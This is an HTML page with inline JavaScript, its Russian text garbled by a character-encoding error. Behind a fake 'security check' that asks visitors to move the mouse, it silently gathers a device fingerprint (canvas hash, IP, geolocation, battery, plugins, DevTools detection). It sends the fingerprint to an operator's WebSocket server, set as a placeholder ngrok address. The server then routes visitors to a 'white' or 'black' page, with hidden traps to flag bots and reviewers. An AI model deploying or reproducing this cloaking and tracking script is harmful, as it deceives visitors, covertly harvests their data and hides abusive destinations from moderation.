<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ó–∞–≥—Ä—É–∑–∫–∞...</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #f5f5f5;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            padding: 0;
            color: #333;
            overflow: hidden;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            margin-bottom: 30px;
        }

        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left: 4px solid #4285f4;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1.2s linear infinite;
            margin-bottom: 20px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 500;
            color: #333;
            margin-bottom: 10px;
        }

        .human-verification {
            background: linear-gradient(145deg, #ffffff, #f0f0f0);
            border-radius: 16px;
            padding: 25px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08), 
                        0 6px 12px rgba(0, 0, 0, 0.05), 
                        inset 0 -3px 0 rgba(0, 0, 0, 0.05);
            text-align: center;
            max-width: 340px;
            transition: all 0.5s ease-in-out, transform 0.3s ease;
            opacity: 1;
            transform: translateY(0);
            position: relative;
            overflow: hidden;
            z-index: 10;
        }

        .human-verification.hidden {
            opacity: 0;
            transform: translateY(20px);
            pointer-events: none;
        }

        .human-verification h3 {
            margin-top: 0;
            margin-bottom: 15px;
            color: #4285f4;
            font-size: 24px;
            font-weight: 600;
        }

        .human-verification p {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #5f6368;
        }

        .mouse-icon {
            display: inline-block;
            width: 40px;
            height: 60px;
            border: 3px solid #4285f4;
            border-radius: 20px;
            position: relative;
            margin: 0 auto 15px;
        }

        .mouse-icon:before {
            content: '';
            position: absolute;
            width: 8px;
            height: 8px;
            background: #4285f4;
            border-radius: 50%;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            animation: mousescroll 2s infinite;
        }

        .pulse-effect {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background: radial-gradient(circle, rgba(66, 133, 244, 0.3) 0%, rgba(66, 133, 244, 0) 70%);
            border-radius: 16px;
            opacity: 0;
            animation: pulse 2s infinite;
            pointer-events: none;
        }

        .bot-trap-link {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            font-size: 0;
            height: 0;
            width: 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes pulse {
            0% { transform: scale(0.95); opacity: 0; }
            50% { transform: scale(1); opacity: 0.6; }
            100% { transform: scale(1.05); opacity: 0; }
        }

        @keyframes mousescroll {
            0% { opacity: 1; top: 10px; }
            50% { opacity: 1; top: 25px; }
            100% { opacity: 0; top: 30px; }
        }

        @media (max-width: 768px) {
            .human-verification {
                width: 85%;
                max-width: 300px;
                padding: 20px;
            }
            
            .loader {
                width: 50px;
                height: 50px;
            }
            
            .loading-text {
                font-size: 18px;
            }
            
            .human-verification h3 {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="loader-container">
        <div class="loader"></div>
        <div class="loading-text">–ó–∞–≥—Ä—É–∑–∫–∞...</div>
    </div>

    <div class="human-verification">
        <div class="pulse-effect"></div>
        <h3>–ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h3>
        <div class="mouse-icon"></div>
        <p>–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–≤–∏–≥–∞–π—Ç–µ –∫—É—Ä—Å–æ—Ä–æ–º, —á—Ç–æ–±—ã –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å</p>
    </div>

    <a href="#" class="bot-trap-link">–°–µ–∫—Ä–µ—Ç–Ω–∞—è —Å—Å—ã–ª–∫–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –±–æ—Ç–æ–≤</a>

    <script>
    (function() {
        'use strict';

        const PAGE_LOAD_START = performance.now();
        const DEFAULT_WHITE_PAGE = 'https://dzen.ru';
        const DEFAULT_BLACK_PAGE = 'https://google.com';
        
        // –≠—Ç—É —Å—Å—ã–ª–∫—É –Ω—É–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ –≤–∞—à WebSocket-—Å–µ—Ä–≤–µ—Ä (–ø–æ–ª—É—á–∞–µ–º—ã–π —á–µ—Ä–µ–∑ ngrok)
        const SERVER_WS_URL = 'wss://YOUR-NGROK-URL.ngrok.io';
        
        let botTrapActivated = false;
        let hadMouseMovement = false;
        let redirectInitiated = false;
        let userInfo = null;
        
        const humanVerificationBlock = document.querySelector('.human-verification');
        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        
        // –°—á–µ—Ç—á–∏–∫ –≤–∏–∑–∏—Ç–æ–≤
        let visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1;
        localStorage.setItem('visitCount', visitCount.toString());

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ Canvas Fingerprint
         */
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 50;

                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#00f';
                ctx.fillText('Canvas Fingerprint üëã', 2, 2);
                ctx.fillStyle = '#f00';
                ctx.arc(50, 30, 15, 0, Math.PI * 2, true);
                ctx.fill();

                return canvas.toDataURL().substring(0, 100) + '...';
            } catch (e) {
                return "Canvas –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            }
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –±–∞—Ç–∞—Ä–µ–µ
         */
        async function getBatteryInfo() {
            if (!navigator.getBattery) return "API –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω";
            
            try {
                const battery = await navigator.getBattery();
                return {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging
                };
            } catch (e) {
                return "–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞";
            }
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–∞–º—è—Ç–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
         */
        function getDeviceMemory() {
            if (navigator.deviceMemory) {
                return `${navigator.deviceMemory}GB`;
            }
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Å–µ—Ç–µ–≤–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
         */
        function getConnectionInfo() {
            const connection = navigator.connection || 
                              navigator.mozConnection || 
                              navigator.webkitConnection;
            
            if (connection) {
                return {
                    type: connection.effectiveType || "unknown",
                    rtt: connection.rtt || "unknown"
                };
            }
            
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
         */
        async function getIpAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (response.ok) {
                    const data = await response.json();
                    return data.ip;
                }
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ IP:", e);
            }
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –Ω–∞ –æ—Å–Ω–æ–≤–µ IP
         */
        async function getGeoLocation(ip) {
            if (ip === "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ") return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                if (response.ok) {
                    const data = await response.json();
                    return `${data.city || ""}, ${data.country_name || ""}`;
                }
            } catch (e) {
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏:", e);
            }
            return "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ";
        }

        /**
         * –°–±–æ—Ä –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
         */
        async function collectUserInfo() {
            const now = performance.now();
            const loadTime = Math.round(now - PAGE_LOAD_START);
            const battery = await getBatteryInfo();
            const ipAddress = await getIpAddress();
            const geoLocation = await getGeoLocation(ipAddress);
            
            return {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                language: navigator.language,
                languages: navigator.languages ? navigator.languages.join(',') : "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                platform: navigator.platform,
                deviceType: isMobile ? '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ' : '–î–µ—Å–∫—Ç–æ–ø',
                visitCount: visitCount,
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —ç–∫—Ä–∞–Ω–µ –∏ –æ–∫–Ω–µ
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    pixelRatio: window.devicePixelRatio || 1
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight
                },
                
                // –°–µ—Ç–µ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è
                url: window.location.href,
                referrer: document.referrer || "none",
                
                // –•–∞—Ä–∞–∫—Ç–µ—Ä–∏—Å—Ç–∏–∫–∏ –±—Ä–∞—É–∑–µ—Ä–∞
                cookiesEnabled: navigator.cookieEnabled,
                localStorage: !!window.localStorage,
                sessionStorage: !!window.sessionStorage,
                hardwareConcurrency: navigator.hardwareConcurrency || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                memory: getDeviceMemory(),
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                connection: getConnectionInfo(),
                doNotTrack: navigator.doNotTrack || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                webdriver: !!navigator.webdriver,
                plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', ') || "–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ",
                
                // –£–Ω–∏–∫–∞–ª—å–Ω—ã–µ –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä—ã
                canvas: getCanvasFingerprint(),
                
                // –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–≤–µ–¥–µ–Ω–∏–∏
                hadMouseMovement: hadMouseMovement,
                botTrapActivated: botTrapActivated,
                
                // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                battery: battery,
                loadTime: loadTime,
                ipAddress: ipAddress,
                geolocation: geoLocation,
                
                // –†–∞–∑–Ω–∏—Ü–∞ –º–µ–∂–¥—É –≤–Ω–µ—à–Ω–∏–º–∏ –∏ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–º–∏ —Ä–∞–∑–º–µ—Ä–∞–º–∏ –æ–∫–Ω–∞ (–ø—Ä–∏–∑–Ω–∞–∫ DevTools)
                widthDiff: window.outerWidth - window.innerWidth,
                heightDiff: window.outerHeight - window.innerHeight
            };
        }

        /**
         * –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ä–µ—à–µ–Ω–∏—è
         */
        async function sendDataToServer(data) {
            return new Promise((resolve, reject) => {
                try {
                    const ws = new WebSocket(SERVER_WS_URL);
                    
                    ws.onopen = () => {
                        console.log("WebSocket —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ");
                        ws.send(JSON.stringify(data));
                    };
                    
                    ws.onmessage = (event) => {
                        const response = JSON.parse(event.data);
                        ws.close();
                        resolve(response);
                    };
                    
                    ws.onerror = (error) => {
                        console.error("WebSocket –æ—à–∏–±–∫–∞:", error);
                        reject({
                            redirect: DEFAULT_WHITE_PAGE,
                            reason: "–û—à–∏–±–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º"
                        });
                    };
                    
                    // –¢–∞–π–º–∞—É—Ç –Ω–∞ —Å–ª—É—á–∞–π, –µ—Å–ª–∏ —Å–µ—Ä–≤–µ—Ä –Ω–µ –æ—Ç–≤–µ—á–∞–µ—Ç
                    setTimeout(() => {
                        if (ws.readyState !== WebSocket.CLOSED) {
                            ws.close();
                            reject({
                                redirect: DEFAULT_WHITE_PAGE,
                                reason: "–¢–∞–π–º–∞—É—Ç —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è —Å —Å–µ—Ä–≤–µ—Ä–æ–º"
                            });
                        }
                    }, 5000);
                } catch (error) {
                    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö:", error);
                    reject({
                        redirect: DEFAULT_WHITE_PAGE,
                        reason: "–ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –¥–∞–Ω–Ω—ã—Ö"
                    });
                }
            });
        }

        /**
         * –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –Ω–∞ —Ü–µ–ª–µ–≤—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É
         */
        function redirect(url) {
            if (redirectInitiated) return;
            redirectInitiated = true;
            
            // –ö–æ—Ä–æ—Ç–∫–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –ø–µ—Ä–µ–¥ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º
            setTimeout(() => {
                window.location.href = url;
            }, 500);
        }

        /**
         * –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è
         */
        async function checkAndRedirect() {
            try {
                // –°–æ–±–∏—Ä–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
                const userData = await collectUserInfo();
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–µ—Ä–≤–µ—Ä –∏ –ø–æ–ª—É—á–∞–µ–º —Ä–µ—à–µ–Ω–∏–µ
                const response = await sendDataToServer(userData);
                
                // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å–æ–≥–ª–∞—Å–Ω–æ —Ä–µ—à–µ–Ω–∏—é —Å–µ—Ä–≤–µ—Ä–∞
                redirect(response.redirect || DEFAULT_WHITE_PAGE);
            } catch (error) {
                // –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
                console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø—Ä–æ–≤–µ—Ä–∫–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", error);
                redirect(error.redirect || DEFAULT_WHITE_PAGE);
            }
        }

        // –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
        document.addEventListener('mousemove', () => {
            if (!hadMouseMovement) {
                hadMouseMovement = true;
                
                // –°–∫—Ä—ã–≤–∞–µ–º –±–ª–æ–∫ –ø—Ä–æ–≤–µ—Ä–∫–∏ —á–µ–ª–æ–≤–µ–∫–∞
                humanVerificationBlock.classList.add('hidden');
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É –ø–æ—Å–ª–µ –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏
                if (!redirectInitiated) {
                    checkAndRedirect();
                }
            }
        });

        // –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≤—É—à–∫–∏ –¥–ª—è –±–æ—Ç–æ–≤
        document.querySelector('.bot-trap-link').addEventListener('click', (e) => {
            e.preventDefault();
            botTrapActivated = true;
            
            if (!redirectInitiated) {
                checkAndRedirect();
            }
        });

        // –î–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –Ω–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ–≤–µ—Ä–∫—É
        if (isMobile) {
            hadMouseMovement = true;
            humanVerificationBlock.classList.add('hidden');
            
            // –ù–µ–±–æ–ª—å—à–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤
            setTimeout(() => {
                if (!redirectInitiated) {
                    checkAndRedirect();
                }
            }, 1000);
        } else {
            // –î–ª—è –ü–ö: –µ—Å–ª–∏ –Ω–µ—Ç –¥–≤–∏–∂–µ–Ω–∏—è –º—ã—à–∏ —á–µ—Ä–µ–∑ 7 —Å–µ–∫—É–Ω–¥, —Å—á–∏—Ç–∞–µ–º —ç—Ç–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º
            setTimeout(() => {
                if (!hadMouseMovement && !redirectInitiated) {
                    botTrapActivated = true;
                    checkAndRedirect();
                }
            }, 7000);
        }
    })();
    </script>
</body>
</html>
